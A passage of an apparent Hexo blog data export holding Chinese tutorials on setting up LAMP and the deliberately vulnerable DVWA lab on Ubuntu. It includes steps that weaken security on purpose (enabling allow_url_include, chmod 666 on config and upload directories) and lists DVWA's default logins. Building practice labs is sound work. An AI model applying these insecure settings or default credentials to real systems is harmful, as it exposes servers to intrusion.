libmysqlclient-dev</span><br></pre></td></tr></table></figure>\n\n<p>但总会有不顺利的情况。。。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eading package lists... Done</span><br><span class=\"line\">Building dependency tree       </span><br><span class=\"line\">   Reading state information... Done</span><br><span class=\"line\">   Some packages could not be installed. This may mean that you have</span><br><span class=\"line\">   requested an impossible situation or if you are using the unstable</span><br><span class=\"line\">   distribution that some required packages have not yet been created</span><br><span class=\"line\">   or been moved out of Incoming.</span><br><span class=\"line\">   The following information may help to resolve the situation:</span><br><span class=\"line\">   The following packages have unmet dependencies:</span><br><span class=\"line\">   mysql-server : Depends: mysql-server-5.1 but it is not going to be instaed</span><br><span class=\"line\"></span><br><span class=\"line\">   E: Unable to correct problems, you have held broken packages.</span><br></pre></td></tr></table></figure>\n\n<p>解决办法：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vi /etc/apt/source.list</span><br></pre></td></tr></table></figure>\n\n<p>在此配置文件中上方添加以下内容：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise main restricted universe multiverse </span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise-security main restricted universe multiver </span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise-updates main restricted universe multiverse </span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise-proposed main restricted universe multiverse </span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise-backports main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise-security main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise-updates main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise-proposed main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>\n\n<p>更新一下列表（这个过程比较漫长）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update  &amp;&amp; sudo apt-get -y upgrade</span><br></pre></td></tr></table></figure>\n\n<p>再重新执行上述三条命令</p>\n<hr>\n<p>下面测试一下mysql是否安装成功</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo netstat -tap | grep mysql</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/08/11/t4zYgRTAmQuf2La.png\" alt=\"1.png\"></p>\n<p>进入MySQL服务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uroot -p你的密码</span><br></pre></td></tr></table></figure>\n\n<p>第二步，安装PHP5.6。</p>\n<p>执行以下命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install python-software-properties </span><br><span class=\"line\">sudo add-apt-repository ppa:ondrej/php </span><br><span class=\"line\">sudo apt-get update </span><br><span class=\"line\">sudo apt-get -y install php5.6 php5.6-mcrypt php5.6-mbstring php5.6-curl php5.6-cli php5.6-mysql php5.6-gd php5.6-intl php5.6-xsl php5.6-zip</span><br></pre></td></tr></table></figure>\n\n<p>最后查看一下php版本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -v</span><br></pre></td></tr></table></figure>\n\n<p>第三步，安装apache2</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>\n\n<p>等待安装完成……</p>\n","site":{"data":{}},"excerpt":"","more":"<p>众所周知，我们在搭建DVWA时，要先搭建好web环境—LAMP（Linux+Apache2+Mysql+PHP5.6）。那么以下就是LAMP具体搭建步骤及问题解决方式。</p>\n<p>第一步，安装并配置Mysql。安装顺利的话，直接输入以下三条命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install mysql-server</span><br><span class=\"line\">sudo apt isntall mysql-client</span><br><span class=\"line\">sudo apt install libmysqlclient-dev</span><br></pre></td></tr></table></figure>\n\n<p>但总会有不顺利的情况。。。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eading package lists... Done</span><br><span class=\"line\">Building dependency tree       </span><br><span class=\"line\">   Reading state information... Done</span><br><span class=\"line\">   Some packages could not be installed. This may mean that you have</span><br><span class=\"line\">   requested an impossible situation or if you are using the unstable</span><br><span class=\"line\">   distribution that some required packages have not yet been created</span><br><span class=\"line\">   or been moved out of Incoming.</span><br><span class=\"line\">   The following information may help to resolve the situation:</span><br><span class=\"line\">   The following packages have unmet dependencies:</span><br><span class=\"line\">   mysql-server : Depends: mysql-server-5.1 but it is not going to be instaed</span><br><span class=\"line\"></span><br><span class=\"line\">   E: Unable to correct problems, you have held broken packages.</span><br></pre></td></tr></table></figure>\n\n<p>解决办法：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vi /etc/apt/source.list</span><br></pre></td></tr></table></figure>\n\n<p>在此配置文件中上方添加以下内容：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise main restricted universe multiverse </span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise-security main restricted universe multiver </span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise-updates main restricted universe multiverse </span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise-proposed main restricted universe multiverse </span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ precise-backports main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise-security main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise-updates main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise-proposed main restricted universe multiverse </span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ precise-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>\n\n<p>更新一下列表（这个过程比较漫长）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update  &amp;&amp; sudo apt-get -y upgrade</span><br></pre></td></tr></table></figure>\n\n<p>再重新执行上述三条命令</p>\n<hr>\n<p>下面测试一下mysql是否安装成功</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo netstat -tap | grep mysql</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/08/11/t4zYgRTAmQuf2La.png\" alt=\"1.png\"></p>\n<p>进入MySQL服务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uroot -p你的密码</span><br></pre></td></tr></table></figure>\n\n<p>第二步，安装PHP5.6。</p>\n<p>执行以下命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install python-software-properties </span><br><span class=\"line\">sudo add-apt-repository ppa:ondrej/php </span><br><span class=\"line\">sudo apt-get update </span><br><span class=\"line\">sudo apt-get -y install php5.6 php5.6-mcrypt php5.6-mbstring php5.6-curl php5.6-cli php5.6-mysql php5.6-gd php5.6-intl php5.6-xsl php5.6-zip</span><br></pre></td></tr></table></figure>\n\n<p>最后查看一下php版本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -v</span><br></pre></td></tr></table></figure>\n\n<p>第三步，安装apache2</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>\n\n<p>等待安装完成……</p>\n"},{"title":"集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之二","date":"2018-11-19T17:00:00.000Z","_content":"\n在上一篇搭建好web环境后，再进行Ubuntu下DVWA的搭建，在搭建过程中会出现各种各样的问题。以下是本菜鸡在搭建过程中出现的问题以及解决办法~\n\n首先在GitHub下载安装DVWA，压缩包放到 /var/www/html之后解压缩\n\n``` shell\natongmu@atongmu-virtual-machine:~/Downloads$ sudo cp -i DVWA-master.zip /var/www/html\natongmu@atongmu-virtual-machine:/var/www/html$sudo unzip DVWA-master.zip\n```\n\n在浏览器输入127.0.0.1/DVWA-master/setup.php后页面显示：需要我们修改配置文件后缀名为.php\n\n``` shell\natongmu@atongmu-virtual-machine:/var/www/html/DVWA-master/config$ sudo mv config.inc.php.dist config.inc.php\n```\n\n菜鸡装到这里，再重启apache2以后发现，在DVWA界面出现了很多PHP不完整代码，如同一个正常人长了天花一般触目惊心……后经分析原因是apache2无法解析PHP代码。到这里，关键一步就是：\n\n``` shell\nsudo apt-get install apache2\nsudo apt-get install php7.2\nsudo apt-get install libapache2-mod-php\n```\n\n第三条命令的目的就是：apache缺少PHP的延展模块，所以无法解析PHP~\n\n之后，页面显示正常……\n\n下一步开始修改下面的disable and no\n\n![1.png](https://i.loli.net/2021/08/11/EXL3qH9g84kfPry.png)\n\n第一处：\n\n``` shell\nsudo vi php.ini\n把allow_url_include = off改为on\n把allow_url_fopen = off改为on\n```\n\n第二处：\n\n``` shell\nsudo apt-get install php7.2-gd\nsudo /etc/init.d/apache2 restart\n```\n\n第三处\n\n``` shell\nsudo apt-get install php7.2-mysql\nsudo /etc/init.d/apache2 restart\n```\n\n在进行第二三处的时候请注意：搭建的dvwa的PHP版本是否是7.2，因为在之前添加apache的PHP扩展模块时，相当于安装了从5.6到7.2的所有模块，dvwa会自动匹配最高级版本，现在的PHP最高版本为7.2.\n\n第四处：\n\n``` shell\nls -al /var/www/html/DVWA-master/external/phpids/0.6/lib/IDS/tmp\nsudo /etc/init.d/apache2 restart\nsudo chmod 666 /var/www/html/DVWA-master/hackable/uploads\nsudo chmod 666 /var/www/html/DVWA-master/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt\nsudo /etc/init.d/apache2 restart\nsudo chmod 666 /var/www/html/DVWA-master/config\nsudo /etc/init.d/apache2 restart\n```\n\n之后本以为会顺利搭完……菜鸡又出现了状况……\n\n在点击下面的creat databases时，页面返回是……\n\n![2.png](https://i.loli.net/2021/08/11/R3L7ehZ5PXty6DV.png)\n\n之后才发现\n\n![3.png](https://i.loli.net/2021/08/11/aFzs6Eiq2HMbJjl.png)\n\n这里的password要与MySQL一致才可以……\n\n重启apache，重新加载url，顺利创建……\n\n以下列出dvwa的默认登陆账号与密码：\n\n*admin/password* gordonb/abc123\n*1337/charley* pablo/letmein\n*smithy/password\n","source":"_posts/集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之二.md","raw":"---\ntitle: 集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之二\ndate: 2018-11-20 01:00:00\ntags:\n- DVWA搭建\n- lamp搭建\n- sqli-labs\n---\n\n在上一篇搭建好web环境后，再进行Ubuntu下DVWA的搭建，在搭建过程中会出现各种各样的问题。以下是本菜鸡在搭建过程中出现的问题以及解决办法~\n\n首先在GitHub下载安装DVWA，压缩包放到 /var/www/html之后解压缩\n\n``` shell\natongmu@atongmu-virtual-machine:~/Downloads$ sudo cp -i DVWA-master.zip /var/www/html\natongmu@atongmu-virtual-machine:/var/www/html$sudo unzip DVWA-master.zip\n```\n\n在浏览器输入127.0.0.1/DVWA-master/setup.php后页面显示：需要我们修改配置文件后缀名为.php\n\n``` shell\natongmu@atongmu-virtual-machine:/var/www/html/DVWA-master/config$ sudo mv config.inc.php.dist config.inc.php\n```\n\n菜鸡装到这里，再重启apache2以后发现，在DVWA界面出现了很多PHP不完整代码，如同一个正常人长了天花一般触目惊心……后经分析原因是apache2无法解析PHP代码。到这里，关键一步就是：\n\n``` shell\nsudo apt-get install apache2\nsudo apt-get install php7.2\nsudo apt-get install libapache2-mod-php\n```\n\n第三条命令的目的就是：apache缺少PHP的延展模块，所以无法解析PHP~\n\n之后，页面显示正常……\n\n下一步开始修改下面的disable and no\n\n![1.png](https://i.loli.net/2021/08/11/EXL3qH9g84kfPry.png)\n\n第一处：\n\n``` shell\nsudo vi php.ini\n把allow_url_include = off改为on\n把allow_url_fopen = off改为on\n```\n\n第二处：\n\n``` shell\nsudo apt-get install php7.2-gd\nsudo /etc/init.d/apache2 restart\n```\n\n第三处\n\n``` shell\nsudo apt-get install php7.2-mysql\nsudo /etc/init.d/apache2 restart\n```\n\n在进行第二三处的时候请注意：搭建的dvwa的PHP版本是否是7.2，因为在之前添加apache的PHP扩展模块时，相当于安装了从5.6到7.2的所有模块，dvwa会自动匹配最高级版本，现在的PHP最高版本为7.2.\n\n第四处：\n\n``` shell\nls -al /var/www/html/DVWA-master/external/phpids/0.6/lib/IDS/tmp\nsudo /etc/init.d/apache2 restart\nsudo chmod 666 /var/www/html/DVWA-master/hackable/uploads\nsudo chmod 666 /var/www/html/DVWA-master/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt\nsudo /etc/init.d/apache2 restart\nsudo chmod 666 /var/www/html/DVWA-master/config\nsudo /etc/init.d/apache2 restart\n```\n\n之后本以为会顺利搭完……菜鸡又出现了状况……\n\n在点击下面的creat databases时，页面返回是……\n\n![2.png](https://i.loli.net/2021/08/11/R3L7ehZ5PXty6DV.png)\n\n之后才发现\n\n![3.png](https://i.loli.net/2021/08/11/aFzs6Eiq2HMbJjl.png)\n\n这里的password要与MySQL一致才可以……\n\n重启apache，重新加载url，顺利创建……\n\n以下列出dvwa的默认登陆账号与密码：\n\n*admin/password* gordonb/abc123\n*1337/charley* pablo/letmein\n*smithy/password\n","slug":"集lamp搭建、DVWA搭建、sqli-labs搭建配置教程及常见问题解决之二","published":1,"updated":"2022-04-29T10:22:34.993Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl2n8fsoa000d5l9jdxcrc3bd","content":"<p>在上一篇搭建好web环境后，再进行Ubuntu下DVWA的搭建，在搭建过程中会出现各种各样的问题。以下是本菜鸡在搭建过程中出现的问题以及解决办法~</p>\n<p>首先在GitHub下载安装DVWA，压缩包放到 /var/www/html之后解压缩</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">atongmu@atongmu-virtual-machine:~/Downloads$ sudo cp -i DVWA-master.zip /var/www/html</span><br><span class=\"line\">atongmu@atongmu-virtual-machine:/var/www/html$sudo unzip DVWA-master.zip</span><br></pre></td></tr></table></figure>\n\n<p>在浏览器输入127.0.0.1/DVWA-master/setup.php后页面显示：需要我们修改配置文件后缀名为.php</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">atongmu@atongmu-virtual-machine:/var/www/html/DVWA-master/config$ sudo mv config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure>\n\n<p>菜鸡装到这里，再重启apache2以后发现，在DVWA界面出现了很多PHP不完整代码，如同一个正常人长了天花一般触目惊心……后经分析原因是apache2无法解析PHP代码。到这里，关键一步就是：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install apache2</span><br><span class=\"line\">sudo apt-get install php7.2</span><br><span class=\"line\">sudo apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure>\n\n<p>第三条命令的目的就是：apache缺少PHP的延展模块，所以无法解析PHP~</p>\n<p>之后，页面显示正常……</p>\n<p>下一步开始修改下面的disable and no</p>\n<p><img src=\"https://i.loli.net/2021/08/11/EXL3qH9g84kfPry.png\" alt=\"1.png\"></p>\n<p>第一处：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vi php.ini</span><br><span class=\"line\">把allow_url_include = off改为on</span><br><span class=\"line\">把allow_url_fopen = off改为on</span><br></pre></td></tr></table></figure>\n\n<p>第二处：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install php7.2-gd</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure>\n\n<p>第三处</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install php7.2-mysql</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure>\n\n<p>在进行第二三处的时候请注意：搭建的dvwa的PHP版本是否是7.2，因为在之前添加apache的PHP扩展模块时，相当于安装了从5.6到7.2的所有模块，dvwa会自动匹配最高级版本，现在的PHP最高版本为7.2.</p>\n<p>第四处：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -al /var/www/html/DVWA-master/external/phpids/0.6/lib/IDS/tmp</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br><span class=\"line\">sudo chmod 666 /var/www/html/DVWA-master/hackable/uploads</span><br><span class=\"line\">sudo chmod 666 /var/www/html/DVWA-master/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br><span class=\"line\">sudo chmod 666 /var/www/html/DVWA-master/config</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure>\n\n<p>之后本以为会顺利搭完……菜鸡又出现了状况……</p>\n<p>在点击下面的creat databases时，页面返回是……</p>\n<p><img src=\"https://i.loli.net/2021/08/11/R3L7ehZ5PXty6DV.png\" alt=\"2.png\"></p>\n<p>之后才发现</p>\n<p><img src=\"https://i.loli.net/2021/08/11/aFzs6Eiq2HMbJjl.png\" alt=\"3.png\"></p>\n<p>这里的password要与MySQL一致才可以……</p>\n<p>重启apache，重新加载url，顺利创建……</p>\n<p>以下列出dvwa的默认登陆账号与密码：</p>\n<p><em>admin/password</em> gordonb/abc123<br><em>1337/charley</em> pablo/letmein<br>*smithy/password</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在上一篇搭建好web环境后，再进行Ubuntu下DVWA的搭建，在搭建过程中会出现各种各样的问题。以下是本菜鸡在搭建过程中出现的问题以及解决办法~</p>\n<p>首先在GitHub下载安装DVWA，压缩包放到 /var/www/html之后解压缩</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">atongmu@atongmu-virtual-machine:~/Downloads$ sudo cp -i DVWA-master.zip /var/www/html</span><br><span class=\"line\">atongmu@atongmu-virtual-machine:/var/www/html$sudo unzip DVWA-master.zip</span><br></pre></td></tr></table></figure>\n\n<p>在浏览器输入127.0.0.1/DVWA-master/setup.php后页面显示：需要我们修改配置文件后缀名为.php</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">atongmu@atongmu-virtual-machine:/var/www/html/DVWA-master/config$ sudo mv config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure>\n\n<p>菜鸡装到这里，再重启apache2以后发现，在DVWA界面出现了很多PHP不完整代码，如同一个正常人长了天花一般触目惊心……后经分析原因是apache2无法解析PHP代码。到这里，关键一步就是：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install apache2</span><br><span class=\"line\">sudo apt-get install php7.2</span><br><span class=\"line\">sudo apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure>\n\n<p>第三条命令的目的就是：apache缺少PHP的延展模块，所以无法解析PHP~</p>\n<p>之后，页面显示正常……</p>\n<p>下一步开始修改下面的disable and no</p>\n<p><img src=\"https://i.loli.net/2021/08/11/EXL3qH9g84kfPry.png\" alt=\"1.png\"></p>\n<p>第一处：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vi php.ini</span><br><span class=\"line\">把allow_url_include = off改为on</span><br><span class=\"line\">把allow_url_fopen = off改为on</span><br></pre></td></tr></table></figure>\n\n<p>第二处：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install php7.2-gd</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure>\n\n<p>第三处</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install php7.2-mysql</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure>\n\n<p>在进行第二三处的时候请注意：搭建的dvwa的PHP版本是否是7.2，因为在之前添加apache的PHP扩展模块时，相当于安装了从5.6到7.2的所有模块，dvwa会自动匹配最高级版本，现在的PHP最高版本为7.2.</p>\n<p>第四处：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -al /var/www/html/DVWA-master/external/phpids/0.6/lib/IDS/tmp</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br><span class=\"line\">sudo chmod 666 /var/www/html/DVWA-master/hackable/uploads</span><br><span class=\"line\">sudo chmod 666 /var/www/html/DVWA-master/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br><span class=\"line\">sudo chmod 666 /var/www/html/DVWA-master/config</span><br><span class=\"line\">sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure>\n\n<p>之后本以为会顺利搭完……菜鸡又出现了状况……</p>\n<p>在点击下面的creat databases时，页面返回是……</p>\n<p><img src=\"https://i.loli.net/2021/08/11/R3L7ehZ5PXty6DV.png\" alt=\"2.png\"></p>\n<p>之后才发现</p>\n<p><img src=\"https://i.loli.net/2021/08/11/aFzs6Eiq2HMbJjl.png\" alt=\"3.png\"></p>\n<p>这里的password要与MySQL一致才可以……</p>\n<p>重启apache，重新加载url，顺利创建……</p>\n<p>以下列出dvwa的默认登陆账号与密码：</p>\n<p><em>admin/password</em> gordonb/abc123<br><em>1337/charley</em> pablo/letmein<br>*smithy/password</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cl2n8ejhn0001s19j17186ato","tag_id":"cl2n8ejht0003s19j72iwd4wj","_id":"cl2n8eji3000bs19jbueldluq"},{"post_id":"cl2n8ejhn0001s19j17186ato","tag_id":"cl2n8eji00007s19j7bbk8dno","_id":"cl2n8eji3000cs19jhnps66gl"},{"post_id":"cl2n8ejhq0002s19j72y25u5k","tag_id":"cl2n8eji2000as19j23p0f2hn","_id":"cl2n8eji5000gs19je6c6b2u2"},{"post_id":"cl2n8ejhq0002s19j72y25u5k","tag_id":"cl2n8eji3000ds19j2vji6kac","_id":"cl2n8eji5000hs19jehil4pll"},{"post_id":"cl2n8ejhq0002s19j72y25u5k","tag_id":"cl2n8eji4000es19j92bo8m8b","_id":"cl2n8eji5000js19j52og5xj0"},{"post_id":"cl2n8ejhw0004s19j47rg17ur","tag_id":"cl2n8eji2000as19j23p0f2hn","_id":"cl2n8eji6000ms19jg7xee9fz"},{"post_id":"cl2n8ejhw0004s19j47rg17ur","tag_id":"cl2n8eji3000ds19j2vji6kac","_id":"cl2n8eji6000ns19j2dcq77n6"},{"post_id":"cl2n8ejhw0004s19j47rg17ur","tag_id":"cl2n8eji4000es19j92bo8m8b","_id":"cl2n8eji7000ps19jffm0g1f2"},{"post_id":"cl2n8ejhx0005s19j2clb5676","tag_id":"cl2n8eji6000ls19j3h7we44c","_id":"cl2n8eji7000rs19jgik50lne"},{"post_id":"cl2n8ejhx0005s19j2clb5676","tag_id":"cl2n8eji6000os19j2k2t2cl1","_id":"cl2n8eji7000ss19jeuypfs08"},{"post_id":"cl2n8ejhz0006s19j87uqfebj","tag_id":"cl2n8eji7000qs19j4osp73ak","_id":"cl2n8eji8000vs19j1tio8egm"},{"post_id":"cl2n8ejhz0006s19j87uqfebj","tag_id":"cl2n8eji7000ts19jgzsxdjft","_id":"cl2n8eji8000ws19jd8ko5ioa"},{"post_id":"cl2n8eji10008s19jg0ps7sd8","tag_id":"cl2n8eji8000us19j1cnldrod","_id":"cl2n8eji9000zs19j2ebp9o07"},{"post_id":"cl2n8eji10008s19jg0ps7sd8","tag_id":"cl2n8eji8000xs19jamqu7722","_id":"cl2n8eji90010s19j7wc6hvdd"},{"post_id":"cl2n8eji20009s19ja2z5h0ji","tag_id":"cl2n8eji8000ys19jfsfaa8zg","_id":"cl2n8eji90011s19j14lt0qyc"},{"post_id":"cl2n8fso200005l9jd17k90uy","tag_id":"cl2n8eji8000ys19jfsfaa8zg","_id":"cl2n8fso700025l9j06osedzo"},{"post_id":"cl2n8fso600015l9j2lh95kra","tag_id":"cl2n8eji7000qs19j4osp73ak","_id":"cl2n8fso800045l9jatn01dtj"},{"post_id":"cl2n8fso600015l9j2lh95kra","tag_id":"cl2n8eji7000ts19jgzsxdjft","_id":"cl2n8fso800065l9jajpg0tc5"},{"post_id":"cl2n8fso800055l9j1j64h85p","tag_id":"cl2n8eji6000ls19j3h7we44c","_id":"cl2n8fso900085l9jbfc65cq9"},{"post_id":"cl2n8fso800055l9j1j64h85p","tag_id":"cl2n8eji6000os19j2k2t2cl1","_id":"cl2n8fso9000a5l9j5o3k40c3"},{"post_id":"cl2n8fso800075l9jbdke6nj7","tag_id":"cl2n8eji8000us19j1cnldrod","_id":"cl2n8fsoa000c5l9